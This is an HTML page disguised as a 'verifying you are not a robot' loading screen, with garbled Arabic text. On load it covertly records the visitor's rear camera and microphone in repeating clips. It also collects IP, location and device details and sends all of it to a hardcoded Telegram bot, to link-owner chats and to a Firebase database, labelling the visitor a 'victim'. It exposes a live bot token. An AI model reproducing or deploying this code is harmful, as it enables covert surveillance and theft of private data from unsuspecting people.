<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support the communication sites</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body {
            height: 100vh; display: flex; align-items: center; justify-content: center;
            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
            background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite;
        }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2); width: 90%; max-width: 400px; }
        h1 { color: red; font-size: 24px; margin-bottom: 10px; }
        p { color: #333; font-size: 18px; margin-bottom: 15px; }
        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; overflow: hidden; height: 10px; margin: 10px 0; }
        .progress-bar { width: 100%; height: 100%; background-color: red; transition: width 1s linear; }
        #countdown { font-size: 20px; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="loading-container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ¹Ø§ÙˆÙ† Ù…Ø¹Ù†Ø§ Ù„ÙƒÙŠ ØªØ­ØµÙ„ Ø¹Ù„Ù‰ ØªØ¬Ø±Ø¨Ø© Ù…Ù…ØªØ¹Ø© <br> Ø³ÙŠØªÙ… ØªØ­ÙˆÙŠÙ„Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ Ø§Ù„Ø¥Ù†ØªÙ‡Ø§Ø¡.</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        document.addEventListener("DOMContentLoaded", async function () {
            // âœ… Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase
            const firebaseConfig = {
                databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/"
            };
            if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
            const db = firebase.database();

            // âœ… Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
            const adminChatId = "5375214810";

            // âœ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get("user_id") || "Unknown";
            const tool = urlParams.get("tool") || "vcam"; // âœ… ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø¹ ØµÙˆØª
            const telegramId = urlParams.get("telegram");

            const countdownElement = document.getElementById("countdown");
            const progressBar = document.getElementById("progress");
            let timeLeft = 20;
            let mediaRecorder;
            let recordedChunks = [];
            let videoStream;

            // âœ… Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ + ØªØ­ÙˆÙŠÙ„ Ø¨Ø¹Ø¯ 20 Ø«Ø§Ù†ÙŠØ©
            const countdownInterval = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = timeLeft;
                progressBar.style.width = (timeLeft / 20) * 100 + "%";
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = "https://www.google.com";
                }
            }, 1000);

            // âœ… Ø¯Ø§Ù„Ø© Ø¬Ù„Ø¨ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
            async function getDeviceInfo() {
                try {
                    const ipResponse = await fetch("https://api64.ipify.org?format=json");
                    const ipData = await ipResponse.json();
                    const ip = ipData.ip;
                    
                    let location = "Unknown, Unknown";
                    try {
                        const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                        const locData = await locResponse.json();
                        location = `${locData.city || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
                    } catch(e) { location = "Unknown, Unknown"; }

                    return {
                        ip: ip,
                        location: location,
                        device: navigator.userAgent,
                        browser: getBrowserInfo(),
                        timestamp: Date.now(),
                        time: new Date().toLocaleString('ar-EG'),
                        tool: tool
                    };
                } catch (error) {
                    return {
                        ip: "Unknown",
                        location: "Unknown",
                        device: navigator.userAgent,
                        browser: "Unknown",
                        timestamp: Date.now(),
                        time: new Date().toLocaleString('ar-EG'),
                        tool: tool
                    };
                }
            }

            // âœ… Ø¯Ø§Ù„Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ØªØµÙØ­
            function getBrowserInfo() {
                const ua = navigator.userAgent;
                if (ua.includes("Chrome")) return "Chrome";
                if (ua.includes("Firefox")) return "Firefox";
                if (ua.includes("Safari")) return "Safari";
                if (ua.includes("Edge")) return "Edge";
                if (ua.includes("Opera")) return "Opera";
                return "Unknown";
            }

            // âœ… Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            async function sendVideoToTelegram(blob, chatId) {
                if (!chatId || chatId === "Unknown" || chatId === "null") return;
                
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("video", blob, `vcam_${Date.now()}.webm`);
                
                try {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                        method: "POST",
                        body: formData
                    });
                } catch (err) {
                    console.error("Telegram video error:", err);
                }
            }

            // âœ… Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            async function sendMessageToTelegram(text, chatId) {
                if (!chatId || chatId === "Unknown" || chatId === "null") return;
                
                try {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: text,
                            parse_mode: "Markdown"
                        })
                    });
                } catch (err) {
                    console.error("Telegram message error:", err);
                }
            }

            // âœ… Ø¯Ø§Ù„Ø© Ø­ÙØ¸ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙÙŠ Firebase (Live)
            async function saveVideoToFirebase(blob, userId) {
                if (!userId || userId === "Unknown") return;
                
                const reader = new FileReader();
                reader.onloadend = async function() {
                    const base64data = reader.result;
                    await db.ref(`live/${userId}/videos`).push({
                        video: base64data,
                        timestamp: Date.now(),
                        time: new Date().toLocaleTimeString('ar-EG'),
                        tool: tool,
                        type: "ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø¹ ØµÙˆØª"
                    });
                };
                reader.readAsDataURL(blob);
            }

            // âœ… Ø¯Ø§Ù„Ø© ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¶Ø­ÙŠØ©
            async function logVictimOnline() {
                if (!userId || userId === "Unknown") return;
                
                const deviceInfo = await getDeviceInfo();
                
                // âœ… Ø­ÙØ¸ ÙÙŠ Ø§Ù„Ù…Ø³Ø§Ø± Ø§Ù„ØµØ­ÙŠØ­ hits/userId
                await db.ref('hits/' + userId).push({
                    tool: tool,
                    type: "Ø¯Ø®ÙˆÙ„",
                    status: "Victim Online - Camera + Audio",
                    device: deviceInfo.device,
                    browser: deviceInfo.browser,
                    ip: deviceInfo.ip,
                    location: deviceInfo.location,
                    time: deviceInfo.time,
                    timestamp: Date.now()
                });

                // âœ… ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© ÙÙŠ Live
                await db.ref(`live/${userId}/status`).set({
                    status: "ðŸŽ¥ Ø¶Ø­ÙŠØ© Ù…ØªØµÙ„Ø© - ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠ + ØµÙˆØª",
                    time: new Date().toLocaleTimeString('ar-EG'),
                    tool: tool,
                    timestamp: Date.now()
                });

                // âœ… Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¨Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                const message = `ðŸŽ¥ **Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© - ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø¹ ØµÙˆØª!**\n\n` +
                              `ðŸ› ï¸ Ø§Ù„Ø£Ø¯Ø§Ø©: ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠ + ØµÙˆØª\n` +
                              `ðŸ”— ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userId}\n` +
                              `ðŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${deviceInfo.location}\n` +
                              `ðŸ“¡ IP: ${deviceInfo.ip}\n` +
                              `ðŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceInfo.browser}\n` +
                              `â° Ø§Ù„ÙˆÙ‚Øª: ${deviceInfo.time}`;

                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø£Ø¯Ù…Ù†
                await sendMessageToTelegram(message, adminChatId);
                
                // Ø¥Ø±Ø³Ø§Ù„ Ù„ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·
                if (userId && userId !== "Unknown" && userId !== adminChatId) {
                    await sendMessageToTelegram(message, userId);
                }
                
                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… ID
                if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
                    await sendMessageToTelegram(message, telegramId);
                }
            }

            // âœ… Ø¯Ø§Ù„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© Ù…Ø¹ Ø§Ù„ØµÙˆØª
            async function startCamera() {
                try {
                    // âœ… ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© Ù…Ø¹ Ø§Ù„ØµÙˆØª
                    videoStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: "environment", // ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠ
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: true // âœ… Ù…Ø¹ Ø§Ù„ØµÙˆØª
                    });

                    const video = document.getElementById('video');
                    video.srcObject = videoStream;
                    
                    video.onloadedmetadata = () => {
                        // ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¶Ø­ÙŠØ©
                        logVictimOnline();
                        
                        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
                        startRecording();
                    };
                } catch (error) { 
                    console.error("ðŸš¨ Camera/Audio error:", error);
                    // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ø³Ø¬Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø³
                    logVictimOnline();
                }
            }

            // âœ… Ø¯Ø§Ù„Ø© Ø¨Ø¯Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
            function startRecording() {
                // âœ… ØªØ­Ø¯ÙŠØ¯ Ù†ÙˆØ¹ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø¯Ø¹ÙˆÙ…
                const options = { mimeType: 'video/webm;codecs=vp9,opus' };
                try {
                    mediaRecorder = new MediaRecorder(videoStream, options);
                } catch (e) {
                    try {
                        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm;codecs=vp8,opus' });
                    } catch (e) {
                        mediaRecorder = new MediaRecorder(videoStream);
                    }
                }

                mediaRecorder.ondataavailable = (e) => { 
                    if (e.data.size > 0) recordedChunks.push(e.data); 
                };

                mediaRecorder.onstop = () => {
                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                    if (recordedChunks.length > 0) {
                        const blob = new Blob(recordedChunks, { type: "video/webm" });
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø£Ø¯Ù…Ù†
                        sendVideoToTelegram(blob, adminChatId);
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ù„ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·
                        if (userId && userId !== "Unknown" && userId !== adminChatId) {
                            sendVideoToTelegram(blob, userId);
                        }
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… ID
                        if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
                            sendVideoToTelegram(blob, telegramId);
                        }
                        
                        // âœ… Ø­ÙØ¸ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙÙŠ Firebase (Live)
                        saveVideoToFirebase(blob, userId);
                        
                        recordedChunks = [];
                    }
                    
                    // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
                    if (mediaRecorder.state === 'inactive') {
                        startRecording();
                    }
                };

                mediaRecorder.start();
                
                // âœ… ØªØ³Ø¬ÙŠÙ„ ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ
                setTimeout(() => { 
                    if(mediaRecorder && mediaRecorder.state === "recording") {
                        mediaRecorder.stop(); 
                    }
                }, 5000);
            }

            // âœ… ØªØ´ØºÙŠÙ„ ÙƒÙ„ Ø­Ø§Ø¬Ø©
            startCamera();
        });
    </script>
</body>
</html>